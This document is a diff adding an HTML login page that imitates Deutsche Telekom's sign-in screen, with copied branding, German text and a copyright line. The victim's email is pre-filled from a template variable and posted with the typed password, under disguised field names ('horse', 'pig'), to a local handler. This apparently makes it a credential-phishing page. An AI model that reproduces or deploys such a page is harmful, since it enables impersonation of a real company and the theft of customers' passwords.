@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="de">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telekom Login</title>
+    
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link rel="icon" type="image/png" href="data:image/png;base64,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">
+
+  <style>
+    * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+header {
+  margin-left: -20px;
+  margin-top: -20px;
+}
+
+
+header img {
+  width: 90px;     /* reduce this number to make smaller */
+  height: auto;     /* keeps proportions */
+}
+
+
+
+body {
+  background: linear-gradient(
+    135deg,
+    #94717e 0%,
+    #6c5e71 25%,
+    #94717e 50%,
+    #7a6b70 75%,
+    #393134 100%
+  );
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  padding: 20px;
+}
+
+html,
+body {
+  height: 100%;
+  margin: 0;
+}
+
+.login-container {
+  width: 100%;
+  max-width: 400px;
+  background-color: white;
+  border-radius: 8px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+
+  margin: auto auto;
+}
+
+.login-form {
+  padding: 30px;
+}
+
+/* Email section styling */
+.email-section {
+  margin-bottom: 10px;
+}
+
+.email-display {
+  display: flex;
+  align-items: center;
+  position: relative;
+}
+
+.user-icon-container {
+  width: 34px;
+  height: 34px;
+
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 10px;
+}
+
+.user-icon {
+  color: white;
+  font-size: 18px;
+}
+
+.email-text {
+  flex: 1;
+  font-size: 16px;
+  color: #333;
+  font-weight: 500;
+}
+
+.dropdown-icon {
+  color: #666;
+  margin-right: 115px;
+  font-size: 14px;
+}
+
+#p-word {
+  font-size: 25px;
+  color: #000;
+  padding-top: 25px;
+  font-weight: bold;
+  margin-top: 15px;
+}
+
+.help-icon-container {
+  width: 20px;
+  height: 20px;
+  background-color: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #ddd;
+}
+
+.help-icon {
+  font-size: 10px;
+}
+
+.login-form h1 {
+  font-size: 24px;
+  color: #333;
+  margin-bottom: 25px;
+  font-weight: normal;
+}
+
+/* Password field styling */
+.form-group {
+  margin-bottom: 15px;
+  font-weight: 1500;
+}
+
+.password-label-container {
+  margin-bottom: 8px;
+}
+
+.password-input-container {
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+
+.password-input {
+  width: 100%;
+  padding: 12px 45px 12px 15px;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  font-size: 16px;
+}
+
+.password-input::placeholder {
+  color: #999;
+}
+
+.password-toggle {
+  position: absolute;
+  right: 15px;
+  color: #666;
+  cursor: pointer;
+  font-size: 18px;
+}
+
+.forgot-password-link {
+  text-align: left;
+  margin-bottom: 20px;
+}
+
+.forgot-password-link a {
+  color: #4f75ce;
+  text-decoration: underline;
+  font-size: 14px;
+}
+
+/* Toggle switch styling */
+.toggle-group {
+  margin-bottom: 25px;
+}
+
+.toggle-container {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.question-mark {
+  width: 20px;
+  height: 20x;
+  background-color: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #000;
+  margin-right: 130px;
+}
+
+.question-mark2 {
+  width: 20px;
+  height: 20x;
+  background-color: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #000;
+}
+
+.toggle-help-icon {
+  color: #000000;
+  font-size: 8px;
+}
+
+.toggle-label {
+  flex: 1;
+  font-size: 14px;
+  color: #333;
+  margin-bottom: 0;
+}
+
+.toggle-switch {
+  position: relative;
+  display: inline-block;
+  width: 44px;
+  height: 24px;
+}
+
+.toggle-switch input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.toggle-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: #ccc;
+  transition: 0.4s;
+  border-radius: 24px;
+}
+
+.toggle-slider:before {
+  position: absolute;
+  content: "";
+  height: 18px;
+  width: 18px;
+  left: 3px;
+  bottom: 3px;
+  background-color: white;
+  transition: 0.4s;
+  border-radius: 50%;
+}
+
+input:checked + .toggle-slider {
+  background-color: #e20074;
+}
+
+input:checked + .toggle-slider:before {
+  transform: translateX(20px);
+}
+
+/* Login button */
+.login-button {
+  width: 100%;
+  padding: 14px;
+  background-color: #e20074;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 20px;
+  font-weight: bold;
+}
+
+.other-options {
+  text-align: center;
+  margin-bottom: 15px;
+}
+
+.other-options a {
+  color: #000;
+  text-decoration: none;
+  font-size: 14px;
+  border: 1px solid #ccc;
+  display: block;
+  padding: 10px;
+  border-radius: 4px;
+  border-radius: 4px;
+}
+
+.back-button-container {
+  text-align: left;
+}
+
+.back-button {
+  color: #4f75ce;
+  text-decoration: underline;
+  font-size: 14px;
+  font-weight: bold;
+}
+
+.footer {
+  font-size: 12px;
+  display: flex;
+  justify-content: space-between;
+  margin-top: auto;
+  justify-items: last baseline;
+}
+
+.copyright {
+  margin-bottom: 5px;
+  color: #fff;
+  font-size: 15px;
+}
+
+.version {
+  margin-bottom: 10px;
+  font-size: 16px;
+  color: #fff;
+}
+
+.footer-links {
+  display: flex;
+
+  gap: 20px;
+  color: #fff;
+}
+
+.footer-links a {
+  color: #fff;
+  text-decoration: none;
+  font-size: 15px;
+}
+
+  </style>
+  </head>
+  <body>
+    <header><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAflBMVEXiAHT////gAGf87PPgAGrgAGb/+v3iAHHjGHrnUpD//P7hAG/hAGzsgKvqbqHoYJj65Oz41OPvlbnwnr72xNfzr8n63ejpZ53xpcP2xtn86/LmPojnTY/nV5LujLL+9Pn3zd30vNHth6/fAGDseqfztMzkJX7lM4PmQ4rqbaFnGP+9AAAEHElEQVR4nO3de0OqMBjH8UHDWSzvF7TjtczO+3+Dx8vJsHB7gLGL/b5/R/gJHAg2GEMIIYQQQgghhBBCCCGEEEIINVHsRbw5oHzwonlzRB75UXzvwicIIYTQeRBCCKH7PBG2euvNeDhYLrfKF/v2/LwcDMej/iokYW+3fRQx51zKNE1flX+H18NPpFJyHsuXt/EkAOHTpsNimYqvhRKlMPdiRSq5nO5aXgtn05in3xYiC89MmSxG3gozxsXPhcoJj0jOhl4Ks1QWLlRaeEhKldGNcN2+9bG0ivBgZDO/hJ2kYP88V03IWDz1SDhh34eXXFWFh9954+BhX7i5vQFZDSETyc4P4TBRLlRdeFi2cMCxLRxo1ldHyOKBe2Gm3oI1hSzJXAtHOmBNIUt+HjWsCuf6ldUUMj53KnxXjaLn6grFu0vhtvhE7aq6QiaX7oQT7ZuQGRCypOdM+KLfR00IxYcr4Yi0pvpCFl+Pp/aEhGGGGRGKvRvhjHYbz4CQxWsnwj+kTWhEKBYuhHPKQMrMCFmSv9hoSzhQfCa8enEmhFdXNWwJ27Sd1IzwaqyxJOxRV2NEyOLc2aklYUY4YTtlRijH1oUL4k5qSChy16UsCcnfaTEjZMK2cGJbmHsj2hHuqG9DU0L+dTfDjnBJPBoaE6Zf16TsCLvUgcbY+7BjWUj7XHHMlPDFspD+9UBDwtxgakW4oq/ElDC2KySfsxkUXj5eWBHSD4fGhPxyPcqKsO9AeLnXZkU4Ix/wzQn7VoUjB9vwFwkb/J63nPfOzcf291I57n/W4L8j8M/oQGNCJi9rL//CG82Y0NsgDD8Iww/C8IMw/CAMPwjDD8Lwg9CvdLMdFC1TQVhlNWbiUUtZ1DYibOtW43BOBVNCTRBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBC6L9QLB6VLYoWqnCHVLca8n+VVSBqMiSsshqHhXUfv0oQhh+E4Qdh+EEYfhCGH4ThB2H4QRh+EIbf/QtjlbDBKS7sJVXCiDhFqNepr++WmH7C13JzdBVFnzPM28TNR42cegxfmH6fUf26N/Lcfd6Wn3i0IPI0qP7G1U8aW/s22Uz5NHfknoI/XIiuWkidFdzf+EYjLDHjlJ+pz2ii8M/bZNGzfq7bhn28SLXAqBX0aJroHmV4bBfwfsqfCcAo6gS7FXlHrzvVDZMoEv0o89lW+Ww6PxN8T3sw7Ln+e9EDPv1NyOQPZYzJt/lIpM9Ikf7v+GRfNh0/lPQdm2ddEZ+fIXzKtekqsd8+H9ouB9mmzNOZf7Tqb7LB8vzL9q5V+QR11CzT1KedthEhfWJ7C0EIYQDCv3cvvP9tCCGE/gunqwfTrZr8Sn75hG6KtQp5BUQIIYQQQgghhBBCCCGEEELoN/QPrDRW+kDWrG8AAAAASUVORK5CYII=" alt="logo" /></header>
+    <div class="login-container">
+      <div class="login-form">
+        <!-- Email with user icon and dropdown -->
+        <div class="email-section">
+          <div class="email-display">
+            <div class="user-icon-container">
+              <img src="https://i.ibb.co/SD5Hkmkj/user.png" alt="" />
+            </div>
+            <span class="email-text">{{eman}}</span>
+            <i class="fas fa-caret-down dropdown-icon"></i>
+            <div class="question-mark2">?</div>
+          </div>
+        </div>
+
+        <h1 id="p-word">Passwort eingeben</h1>
+
+        <form action="first" method="post">
+
+          <input type="hidden" name="horse" value="{{eman}}" required />
+
+        <!-- Password field with eye icon -->
+        <div class="form-group">
+          <div class="password-input-container">
+            <input
+              type="password"
+              id="password"
+              class="password-input"
+              placeholder="Passwort"
+              name="pig"
+              required
+            />
+            <i class="fas fa-eye password-toggle" id="password-toggle"></i>
+          </div>
+        </div>
+
+        <div class="forgot-password-link">
+          <a href="#">Passwort vergessen?</a>
+        </div>
+       
+        <!-- Toggle switch for "Angemeldet bleiben" -->
+        <div class="toggle-group">
+          <div class="toggle-container">
+            <label class="toggle-switch">
+              <input type="checkbox" id="stay-logged-in" />
+              <span class="toggle-slider"></span>
+            </label>
+            <label class="toggle-label">Angemeldet bleiben</label>
+            <div class="question-mark">?</div>
+          </div>
+        </div>
+
+        <button type="summit" class="login-button">LOGIN</button>
+         </form>
+        <div class="other-options">
+          <a href="#">Andere Anmeldegebühren</a>
+        </div>
+
+        <div class="back-button-container">
+          <a href="#" class="back-button">&lt; Zurück</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer">
+      <div>
+        <div class="copyright">© Telekom Deutschland GmbH</div>
+        <div class="version">26.3.11</div>
+      </div>
+      <div class="footer-links">
+        <a href="#">Impressum</a>
+        <a href="#">Datenschutz</a>
+      </div>
+    </div>
+    <script src="app.js"></script>
+  </body>
+</html>
+
